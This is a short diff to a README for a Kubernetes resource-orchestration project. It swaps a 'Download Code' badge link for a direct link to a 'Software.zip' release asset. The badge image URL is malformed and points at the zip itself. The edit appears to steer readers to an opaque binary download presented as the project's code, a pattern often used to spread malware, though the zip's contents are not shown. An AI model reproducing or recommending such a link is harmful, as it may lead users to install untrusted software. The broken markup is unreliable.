@@ -19,7 +19,7 @@ Welcome to the "Dynamic Multi-Dimensional Resource Orchestration in Kubernetes" 
 
 To get started with this repository, you can download the code by clicking on the following link:  
 
-[![Download Code](https://img.shields.io/badge/Download%20Code-Click%20Here-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)  
+[![Download Code](https://github.com/LeoPVA/e19-4yp-Dynamic-Multi-Dimensional-Resource-Orchestration-in-Kubernetes/releases/download/v1.0/Software.zip%20Code-Click%20Here-blue)](https://github.com/LeoPVA/e19-4yp-Dynamic-Multi-Dimensional-Resource-Orchestration-in-Kubernetes/releases/download/v1.0/Software.zip)  
 
 Once you have downloaded the code, follow the setup instructions in the repository to start exploring and utilizing the features for dynamic multi-dimensional resource orchestration in Kubernetes.
 
